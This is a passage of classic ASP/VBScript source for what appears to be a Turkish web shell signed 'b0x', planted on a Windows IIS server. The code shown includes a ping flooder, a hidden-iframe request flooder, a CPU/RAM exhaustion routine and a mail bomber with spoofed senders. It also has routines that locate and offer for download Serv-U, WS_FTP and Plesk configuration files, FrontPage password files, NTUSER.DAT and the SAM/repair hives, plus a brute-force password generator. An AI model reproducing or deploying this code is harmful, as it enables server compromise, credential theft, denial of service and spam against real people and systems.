		response.write "&nbsp;<b><font color=#FAFEDE>Deleting :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	set f = nothing
	Err.Number = 0
	Response.Flush
	
	response.write "</td></tr></table>"
	Response.Flush
	
	Call tester(f1.path)
	
	Next
end sub

Sub arama(yer)
on error resume next
	Set f = b0x.GetFolder(yer)
	Set fc = f.SubFolders
	For Each f1 In fc
		
		Set f2 = b0x.GetFolder(f1.path)
	    Set fc2 = f2.Files
	    For Each f12 In fc2
	    	
	    	if InStr(Ucase(f12.name),Ucase(hacked)) > 0 then
	    		downStr = "<table align=""center""><tr><td align=""center"" class=""kbrtm""><font class=""k2""><a href='"&FilePath&"?mode=6&file="&f12.path&"&Path="&Path&"&Time="&time&"'> ? </a></font>"
    	        if Ucase(hacked)="MDB" then
    	            Response.Write downStr&"<font class=""k1"" ><a href='"&FilePath&"?mode=5&Path="&Path&"&del="&f12.path&"&Time="&time&"'> û </a></font> - <a href='"&dosyapath&"?mode=13&file="&f12.path&"&Path="&Path&"&Time="&time&"'>"&f12.path&" ["&f12.size&"]"&"</a></b><br></td></tr></table>"
    	            i=i+1
    	        else
    	            Response.Write downStr&"<font class=""k1""><a href='"&FilePath&"?mode=5&Path="&Path&"&del="&f12.path&"&Time="&time&"'> û </a><a href='"&FilePath&"?mode=10&file="&f12.path&"&Path="&Path&"&Time="&time&"'> ! </a></font> - <a href='"&dosyapath&"?mode=9&file="&f12.path&"&Path="&Path&"&Time="&time&"'>"&f12.path&" [<font color=yellow>"&f12.size&"</font>]"&"</a></b><br></td></tr></table>"
    	            i=i+1
    	        end if
            end if
			Response.Flush
			
         next
         set f2 = nothing
         set fc2 = nothing
	
	Call arama(f1.path)
	
	next
   	set f = nothing
    set fc = nothing

end sub

Sub Ping_Bomb_b0x(b0xsite,b0xpings,b0xtimeout,b0xbyte)
'///  by b0x. ?zel modüller ekledim =). Ne Mutlu TURKUM D?YENE. 
 noattack = 1
 bonus = 0
 If b0xpings = "" Then b0xpings = 4
 If b0xpings = 0 Then b0xpings = 4
 If b0xtimeout = "" Then b0xtimeout = 750
 If InStr(b0xsite,"savsak") > 0 or InStr(b0xsite,"yagmurlu") or InStr(b0xsite,"gov.tr") > 0 then noattack = 0
 If InStr(b0xsite,"cyber") > 0 or InStr(b0xsite,"tahri") > 0 or InStr(b0xsite,"hack") > 0 or InStr(b0xsite,"team") > 0 then bonus = 1

  response.write "<textarea style='width:100%;height:350;' >"
  if noattack = 1 then
  if bonus = 1 then 
  	b0xpings = b0xpings * 20
  	response.write "Ekstra *20 Bonus kazand?n.      "
  end if

  Set Sh = CreateObject("WScript.Shell")
  if b0xbyte = "" then
  Set ExCmd = Sh.Exec("ping -n " & b0xpings _
   & " -w " & b0xtimeout & " " & b0xsite)
  else
  Set ExCmd = Sh.Exec("ping -n " & b0xpings _
   & " -w " & b0xtimeout & " " & b0xsite & " -l " & b0xbyte)
  end if
  depola = ExCmd.StdOut.ReadAll
  response.write depola
  Select Case InStr(ExCmd.StdOut.Readall,"TTL=")
   Case 0 IsConnectable = False
   Case Else IsConnectable = True
  End Select
  else
  	response.write "Tasvip Etmedi?imiz Bir siteye Sald?r? yap?yorsun. Tekrarlama K?tü olur senin için. CIZZZ =) euheu by b0x                                                                                                           "
  	response.write "Bu b0x sahibine,  GOv.TR  ve Com.TR sitelere kar?? Koruma gerçekle?tirildi. TURK TURK ü VURMAZ.. Kalle?lik yapma by b0x       "
  	response.cookies("b0x") = "1"
  	response.cookies("b0x").expires = now + 365
  	count=0
  end if
  response.write "</textarea>"
  
End Sub

Sub Somurgen(filex,urlx)
for i=0 to CInt(filex)
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td>"&i&".  Robot Ba?land?..</td></tr></table>"
response.Write "<iframe style='width:0; height:0' src='"&urlx&"'></iframe>"
next
End Sub

Sub Ram_Cpu
on error resume next
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'><b> RAM & CPU FUcker for SERVER 0 </b></td></tr></table>"
response.write "<br><br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> ZARAR verme MEkanizmas? Devrede... </td></tr></table>"
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> Durdurmak için Pencereyi kapat. Her 2 Saniyede bir 3 program aç?l?yor...</td></tr></table>"
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> <b>by b0x</b></td></tr></table>"
response.Write "<iframe style='width:0; height:0' src='"&FilePath&"?mode=31&islem=1'></iframe>"
response.Write "<iframe style='width:0; height:0' src='"&FilePath&"?mode=31&islem=2'></iframe>"
response.Write "<iframe style='width:0; height:0' src='"&FilePath&"?mode=31&islem=3'></iframe>"
response.write "<META http-equiv=refresh content=2;URL='"&FilePath&"?mode=31&file=1'>"
response.flush
end Sub

function TextYarat(intLen)
str=""
Randomize
for i=1 to intLen
	str=str & Mid(charset,Int((Len(charset)-1+1)*Rnd+1),1)
next
TextYarat=str
end function

function MailSec()
dim strNewText,i
str=""
Randomize
mail = mail_array(round(rnd()*4))
uzanti = uzanti_array(round(rnd()*6))
str = "@"& mail &"."&  uzanti
MailSec = str
end function

function MailKorumasi(mailx)
MailKorumasi = 0
for i=0 to 9
	If Instr(UCASE(mailx), yasak_array(i)) Then
		MailKorumasi = 1
	end if
next
end function

Function MailYarat()
	MailYarat = TextYarat(8) & MailSec()
end function

Function TextYarat2()
	TextYarat2 = TextYarat(200)
end function

Function BaslikYarat()
	BaslikYarat = TextYarat(10)
end function

Sub MailBomber_by_b0x(alicix)
response.cookies("bilesen") = "1"
on error resume next
Set mailObj = Server.CreateObject("CDONTS.NewMail")
	mailObj.From    = MailYarat()
	mailObj.To      = alicix
	mailObj.Subject = BaslikYarat()
	mailObj.Body    = TextYarat2()
	mailObj.Send
Set mailObj = Nothing
if err <> 0 then
	on error resume next
	Set mailObj = Server.CreateObject("CDO.Message")
		mailObj.From = MailYarat()
		mailObj.To = alicix
		mailObj.Subject = BaslikYarat()
		mailObj.TextBody = TextYarat2()
		mailObj.Send
	Set mailObj = Nothing
	if err <> 0 then
		response.cookies("bilesen") = "0"
	end if
end if
End Sub

Sub yazorta(yazx)
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> "&yazx&" </td></tr></table>"
End Sub
Sub yazsol(yazx)
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='left'> "&yazx&" </td></tr></table>"
End Sub
Sub yazortaa(yazx)
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> "&yazx&" </td></tr></table>"
End Sub
Sub yazsoll(yazx)
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='left'> "&yazx&" </td></tr></table>"
End Sub

Function OS()
on error resume next
strComputer = "."
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colItems = objWMI.ExecQuery("Select * from Win32_OperatingSystem",,48)
For Each objItem in colItems
VerBig = Left(objItem.Version,3)
Next
Select Case VerBig
Case "5.0" OSystem = "W2K"
Case "5.1" OSystem = "XP"
Case "5.2" OSystem = "Windows 2003"
Case "4.0" OSystem = "NT 4.0**"
Case Else OSystem = "Unknown - probably Win 9x"
End Select
OS = OSystem
End Function

Sub FolderExistx(yer)
if b0x.FolderExists(yer) then
	yazorta("<font class=""k1""><a title="" Dizini Copy/Move File?? "" href='"&FilePath&"?mode=2&Path="&yer&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&Path="&yer&"&del="&yer&"&Time="&time&"'>û</a> 1</font><font size=2><b><a title="" Dizinin içine Gir "" href='"&FilePath&"?Path="&yer&"&Time="&time&"'> "&yer&"</a></b>")
end if
End Sub

Sub b0xServuRemote()
j=0
servu = array("C:\Program Files\base.ini","C:\base.ini","C:\Program Files\Serv-U\base.ini","C:\Program Files\Serv-U\ServUAdmin.ini","C:\Program Files\Serv-U\SERV-U.ini","C:\Program Files\Serv-U\ServUDaemon.ini","C:\Program Files\SERV-U.ini","C:\SERV-U.ini","C:\Program Files\ServUDaemon.ini","C:\ServUDaemon.ini","C:\Program Files\WS_FTP.ini","C:\WS_FTP.ini","C:\Program Files\WS_FTP\WS_FTP.ini","C:/Program Files/Gene6 FTP Server/RemoteAdmin/remote.ini","C:/users.txt","D:/users.txt","E:/users.txt")
for i=0 to 16
if b0x.FileExists(servu(i)) then
downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&servu(i)&"&Time="&time&"'>û</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Copy/Move File?? "" href='"&FilePath&"?mode=7&file="&servu(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&servu(i)&"&islem="&servu(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
yazorta("<a title="" ?çini Gomek için T?kla "" href='"&FilePath&"?mode=9&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>"&servu(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek için T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&servu(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
j=j+1
end if
next
if j = 0 then
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Remote olarak Sonuç bulunamad?. Geli?mi? aramay? seçiniz. <font face=Wingdings size=5>N</font> </font>")
end if
servufolder = array("C:\Program Files\Serv-U","C:/Program Files/Gene6 FTP Server/RemoteAdmin","C:/Program Files/Gene6 FTP Server/Accounts/Helm FTP Users/users")
for i=0 to 2
FolderExistx(servufolder(i))
next
End Sub

Sub b0xPleskRemote()
j=0
plesk = array("c:/Program Files/SWsoft/Plesk/MySQL/Data/mysql","c:/Program Files/SWsoft/Plesk","c:/Program Files/SWsoft/Plesk/MySQL/Data/psa","c:/Program Files/SWsoft/Plesk/Databases/MySQL/Data/mysql","c:\Program Files\swsoft\autsav.sav")
for i=0 to 3
if b0x.FolderExists(plesk(i)) then
yazorta("<font class=""k1""><a title="" Dizini Copy/Move File?? "" href='"&FilePath&"?mode=2&Path="&plesk(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&Path="&plesk(i)&"&del="&plesk(i)&"&Time="&time&"'>û</a> 1</font><font size=2><b><a title="" Dizinin içine Gir "" href='"&FilePath&"?Path="&plesk(i)&"&Time="&time&"'>"&plesk(i)&"</a></b>")
j=j+1
end if
next
if j = 0 then
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> "&plesk(0)&" ve "&plesk(1)&" dizinleri bulunamad?. <font face=Wingdings size=5>N</font> </font>")
end if
if b0x.FileExists(plesk(4)) then
downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&servu(i)&"&Time="&time&"'>û</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&servu(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&servu(i)&"&islem="&servu(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
yazorta("<a title="" ?çini Gomek için T?kla "" href='"&FilePath&"?mode=9&file="&servu(i)&"&Path="&FolderPath&"&Time="&time&"'>"&servu(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek için T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&servu(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
else
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Plesk'in  Autsav.sav Dosyas? bulunamad?. <font face=Wingdings size=5>N</font> </font>")
end if 
End Sub

Sub b0xSam()
	Err.Number=0
	on error resume next
	Set MyFile = b0x.CreateTextFile("C:config\test.b0x", True)
	MyFile.write " b0x Was Here... =) "
	set MyFile = Nothing
	if Err.Number <> 0 then
		response.write "<center>&nbsp;<b><font color=#FBE1D7>Writing :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "<center>&nbsp;<b><font color=#FAFEDE>Writing :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	Err.Number=0
	on error resume next
	b0x.DeleteFile "C:config\test.b0x",true
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Deleting :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;</center>"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Deleting :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;</center>"
	end if
	on error resume next
	url = "C:config\"
    Set f = b0x.GetFolder(url)
    if err <> 0 then
   	url = "C:\WINDOWS\system32\config\"
    Set f = b0x.GetFolder(url)
    end if
    
    Set fc = f.Files
    For Each f1 In fc
       downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&url&"&del="&url&""&f1.name&"&Time="&time&"'>û</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&url&""&f1.name&"&Path="&url&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&url&""&f1.name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&url&""&f1.name&"&islem="&f1.name&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
       yazorta("<a title="" ?çini Gomek için T?kla "" href='"&FilePath&"?mode=9&file="&url&""&f1.Name&"&Path="&url&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek için T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&url&""&f1.name&"&Time="&time&"&Path="&url&"'>!</a>"&downStr&"</font>")
    Next
end Sub

Sub b0xVti_Pvt()
	j=0
	local = request.servervariables("APPL_PHYSICAL_PATH")
	vti = array(""&local&"\_vti_pvt\access.cnf",""&local&"\..\_vti_pvt\access.cnf",""&local&"\..\..\_vti_pvt\access.cnf",""&local&"\..\..\..\_vti_pvt\access.cnf",""&local&"\_vti_pvt\postinfo.html",""&local&"\..\_vti_pvt\postinfo.html",""&local&"\..\..\_vti_pvt\postinfo.html",""&local&"\..\..\..\_vti_pvt\postinfo.html",""&local&"\vti_pvt/service.pwd",""&local&"\..\vti_pvt/service.pwd",""&local&"\..\..\vti_pvt/service.pwd",""&local&"\..\..\..\vti_pvt/service.pwd")
		for i=0 to 11
		if b0x.FileExists(vti(i)) then
			downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&vti(i)&"&Time="&time&"'>û</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&vti(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&vti(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&vti(i)&"&islem="&vti(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
			yazorta("<a title="" ?çini Gomek için T?kla "" href='"&FilePath&"?mode=9&file="&vti(i)&"&Path="&FolderPath&"&Time="&time&"'>"&vti(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek için T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&vti(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
			j=j+1
		end if
	next
	if j = 0 then
		yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Sonuç bulunamad?. Daha geni? Arama yap?n by b0x <font face=Wingdings size=5>N</font> </font>")
	end if
end sub

Sub b0xNTUser(oturum)
	j=0
	ntuser = array("c:\documents and settings\"&oturum&"\NTUSER.DAT","c:\documents and settings\Administrator\NTUSER.DAT","c:\documents and settings\"&oturum&"\ntuser.dat.log","c:\documents and settings\Administrator\ntuser.dat.log","c:\documents and settings\"&oturum&"\ntuser.ini","c:\documents and settings\Administrator\ntuser.ini")
	for i=0 to 5
		if b0x.FileExists(ntuser(i)) then
			downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&ntuser(i)&"&Time="&time&"'>û</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&ntuser(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&ntuser(i)&"&islem="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
			yazorta("<a title="" ?çini Gomek için T?kla "" href='"&FilePath&"?mode=9&file="&ntuser(i)&"&Path="&FolderPath&"&Time="&time&"'>"&ntuser(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek için T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&ntuser(i)&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font>")
			j=j+1
		end if
	next
	if j = 0 then
		yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Sonuç bulunamad?. Daha geni? Arama yap?n by b0x <font face=Wingdings size=5>N</font> </font>")
	end if
end sub

Sub b0xRepair()
	Err.Number=0
	on error resume next
	Set MyFile = b0x.CreateTextFile("c:..\repair\test.b0x", True)
	MyFile.write " b0x Was Here... =) "
	set MyFile = Nothing
	if Err.Number <> 0 then
		response.write "<center>&nbsp;<b><font color=#FBE1D7>Writing :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "<center>&nbsp;<b><font color=#FAFEDE>Writing :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	Err.Number=0
	on error resume next
	b0x.DeleteFile "c:..\repair\test.b0x",true
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Deleting :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;</center>"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Deleting :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;</center>"
	end if
	on error resume next
	url = "c:..\repair\"
    Set f = b0x.GetFolder(url)
    if err <> 0 then
   	url = "C:\WINDOWS\repair\"
    Set f = b0x.GetFolder(url)
    end if
    
    Set fc = f.Files
    For Each f1 In fc
       downStr = "<a title=""Dosyay? Sil"" href='"&FilePath&"?mode=5&Path="&url&"&del="&url&""&f1.name&"&Time="&time&"'>û</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&url&""&f1.name&"&Path="&url&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Dosyay? Copy & Ta?? "" href='"&FilePath&"?mode=7&file="&url&""&f1.name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format De?i?tir "" href='"&FilePath&"?mode=16&file="&url&""&f1.name&"&islem="&f1.name&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
       yazorta("<a title="" ?çini Gomek için T?kla "" href='"&FilePath&"?mode=9&file="&url&""&f1.Name&"&Path="&url&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>± <a title="" Dosyay? Editlemek için T?kla by b0x :) "" href='"&FilePath&"?mode=10&file="&url&""&f1.name&"&Time="&time&"&Path="&url&"'>!</a>"&downStr&"</font>")
    Next
end Sub

Function kodolustur(aralik)
' belirtitiim aral?kda kod olu?tuuyorurum. 01#01#01#01# ba?lang?ç iiçin by b0x
	dim coding
	coding = ""
	for i=1 to CInt(aralik)
		coding = coding + "01#"
	next
	kodolustur = coding
End Function

Function diziolustur()
' Seçilen Charset leri burda birle?tiriyorum by b0x
	Dim dizi
	dizi=""
	if not k1 = "" then dizi = dizi & karakter1
	if not k2 = "" then dizi = dizi & karakter2
	if not k3 = "" then dizi = dizi & karakter3
	if not k4 = "" then dizi = dizi & karakter4
	diziolustur = dizi
End Function

Function Sifreyarat(codex,aralik,dizix)
' Stirng kodunu sa?dan ç?zümleyerek ?ifre yarat?yor by b0x
	dim hash
	dim sifre
	hash=""
	sifre=""
	i=CInt(aralik)
	Do While i>0 
		hash = CInt(Mid(codex,((i-1)*3)+1,2))  ' Sa?dan say?lar? al?yor.
		sifre = Mid(dizix,hash,1) & sifre
	i=i-1
	Loop 
	Sifreyarat = sifre
End Function

Function SonrakiAdim(codex,aralik,dizix)
' sonraki ad?ma haz?rl?k coded Developed By TurkisH-RuleZ
Dim hash
hash = ""
increment=0
goup=0
hashing = ""
i=CInt(aralik)
Do While i>0 
hash = CInt(Mid(codex,((i-1)*3)+1,2))  ' Sa?dan say?lar? al?yor.
' Carry out ? di?eirne giri? yap increment the next one
if hash => Len(dizix) then 
	increment = 1
	hash = 1
else if increment = 1 then
	hash = hash+1
	increment = 0
end if 
end if
' e?er ara1 hanelki ?ifreleme bitti ise di?eirne ?kams? gerek ara1++
if i = 1 AND hash>= Len(dizix)-1 then goup=1
' Brute biti?ini g?steriiyorum. 
if i = CInt(aralik) AND hash>= Len(dizix) AND ara1 = ara2 then getend=1   ''' BRUTE ç?k??? bitti?ini anal?yorumm  GETEND =1 !!!!!!!!!!!!!
' hash i bir sonraki ad?ma haz?rla
if i = CInt(aralik) then hash = hash + 1
'yeni hash numaras? olu?tur
if hash <10 then hash = "0" & hash
hashing = hash &"#" & hashing
i=i-1
Loop 
coding = hashing 
' e?erki goup =1 then hane atla ve yeni stireg ol?utur
if goup = 1 then 
	coding = ""
	ara1 = CInt(aralik) + 1
	for j=1 to ara1
		coding = coding + "01#"
	next
end if
SonrakiAdim = coding
End Function

Sub Cookyaz(str1,str2,str3)
	if not str3 = "" then
		response.cookies(str1)("str2") = str3
		response.cookies(str1).expires = now+100
		session("say") = CInt(session("say")) + 1
	end if
End Sub
Sub HashFounded(str1,str2)
	if not request.cookies(str1)("sifre") = "" then
		yazsol("<b>Bulundu: "&request.cookies(str1)(str2)&"  ->> "&request.cookies(str1)("sifre")&" </b>")
		inject3 = CInt(inject3) + 1
	end if
End Sub
Sub hashyes(str1,str2,md5x,pwd)
	if not request.cookies(str1)(str2) = "" AND UCASE(request.cookies(str1)(str2)) = md5x then
		yazsol("BULDUuuuuuuuuuuuuuuu " & pwd & " -  " & request.cookies(str1)(str2)&"")
		response.cookies(str1)("sifre") = pwd
	end if
End Sub
'*************************  ZORUNLU UPLOAD için GEREKLi =((  **********************************************************************************************
Class clsUpload
    Private mbinData
    Private mlngChunkIndex
    Private mlngBytesReceived
    Private mstrDelimiter
    Private CR
    Private LF
    Private CRLF
    Private mobjFieldAry()
    Private mlngCount

    Private Sub RequestData
        Dim llngLength
        mlngBytesReceived = Request.TotalBytes
        mbinData = Request.BinaryRead(mlngBytesReceived)
    End Sub

    Private Sub ParseDelimiter()
        mstrDelimiter = MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)
    End Sub

    Private Sub ParseData()
        Dim llngStart
        Dim llngLength
        Dim llngEnd
        Dim lbinChunk
        llngStart = 1
        llngStart = InStrB(llngStart, mbinData, mstrDelimiter & CRLF)
        While Not llngStart = 0
            llngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2
            llngLength = llngEnd - llngStart
            lbinChunk = MidB(mbinData, llngStart, llngLength)
            Call ParseChunk(lbinChunk)
            llngStart = InStrB(llngStart + 1, mbinData, mstrDelimiter & CRLF)
        Wend
    End Sub

    Private Sub ParseChunk(ByRef pbinChunk)
        Dim lstrName
        Dim lstrFileName
        Dim lstrContentType
        Dim lbinData
        Dim lstrDisposition
        Dim lstrValue
        lstrDisposition = ParseDisposition(pbinChunk)
        lstrName = ParseName(lstrDisposition)
        lstrFileName = ParseFileName(lstrDisposition)
        lstrContentType = ParseContentType(pbinChunk)
        If lstrContentType = "" Then
            lstrValue = CStrU(ParseBinaryData(pbinChunk))
        Else
            lbinData = ParseBinaryData(pbinChunk)
        End If
        Call AddField(lstrName, lstrFileName, lstrContentType, lstrValue, lbinData)
    End Sub

    Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)
        Dim lobjField
        ReDim Preserve mobjFieldAry(mlngCount)
        Set lobjField = New clsField
        lobjField.Name = pstrName
        lobjField.FilePath = pstrFileName
        lobjField.ContentType = pstrContentType
        If LenB(pbinData) = 0 Then
            lobjField.BinaryData = ChrB(0)
            lobjField.Value = pstrValue
            lobjField.Length = Len(pstrValue)
        Else
            lobjField.BinaryData = pbinData
            lobjField.Length = LenB(pbinData)
            lobjField.Value = ""
        End If
        Set mobjFieldAry(mlngCount) = lobjField
        mlngCount = mlngCount + 1
    End Sub

    Private Function ParseBinaryData(ByRef pbinChunk)
        Dim llngStart
        llngStart = InStrB(1, pbinChunk, CRLF & CRLF)
        If llngStart = 0 Then Exit Function
        llngStart = llngStart + 4
        ParseBinaryData = MidB(pbinChunk, llngStart)
    End Function

    Private Function ParseContentType(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStrB(1, pbinChunk, CRLF & CStrB("Content-Type:"), vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStrB(llngStart + 15, pbinChunk, CR)
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 15
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseContentType = Trim(CStrU(MidB(pbinChunk, llngStart, llngLength)))
    End Function

    Private Function ParseDisposition(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStrB(1, pbinChunk, CRLF & CStrB("Content-Disposition:"), vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStrB(llngStart + 22, pbinChunk, CRLF)
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 22
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseDisposition = CStrU(MidB(pbinChunk, llngStart, llngLength))
    End Function

    Private Function ParseName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStr(1, pstrDisposition, "name=""", vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStr(llngStart + 6, pstrDisposition, """")
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 6
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseName = Mid(pstrDisposition, llngStart, llngLength)
    End Function

    Private Function ParseFileName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart = InStr(1, pstrDisposition, "filename=""", vbTextCompare)
        If llngStart = 0 Then Exit Function
        llngEnd = InStr(llngStart + 10, pstrDisposition, """")
        If llngEnd = 0 Then Exit Function
        llngStart = llngStart + 10
        If llngStart >= llngEnd Then Exit Function
        llngLength = llngEnd - llngStart
        ParseFileName = Mid(pstrDisposition, llngStart, llngLength)
    End Function

    Public Property Get Count()
        Count = mlngCount
    End Property

    Public Default Property Get Fields(ByVal pstrName)
        Dim llngIndex
        If IsNumeric(pstrName) Then
            llngIndex = CLng(pstrName)
            If llngIndex > mlngCount - 1 Or llngIndex < 0 Then
                Call Err.Raise(vbObjectError + 1, "clsUpload.asp", "Object does not exist within the ordinal reference.")
                Exit Property
            End If
            Set Fields = mobjFieldAry(pstrName)
        Else
            pstrName = LCase(pstrname)
            For llngIndex = 0 To mlngCount - 1
                If LCase(mobjFieldAry(llngIndex).Name) = pstrName Then
                    Set Fields = mobjFieldAry(llngIndex)
                    Exit Property
                End If
            Next
        End If
        Set Fields = New clsField
    End Property

    Private Sub Class_Terminate()
        Dim llngIndex
        For llngIndex = 0 To mlngCount - 1
            Set mobjFieldAry(llngIndex) = Nothing

        Next
        ReDim mobjFieldAry(-1)
    End Sub

    Private Sub Class_Initialize()
        ReDim mobjFieldAry(-1)
        CR = ChrB(Asc(vbCr))
        LF = ChrB(Asc(vbLf))
        CRLF = CR & LF
        mlngCount = 0
        Call RequestData
        Call ParseDelimiter()
        Call ParseData
    End Sub

    Private Function CStrU(ByRef pstrANSI)
        Dim llngLength
        Dim llngIndex
        llngLength = LenB(pstrANSI)
        For llngIndex = 1 To llngLength
            CStrU = CStrU & Chr(AscB(MidB(pstrANSI, llngIndex, 1)))
        Next
    End Function

    Private Function CStrB(ByRef pstrUnicode)
        Dim llngLength
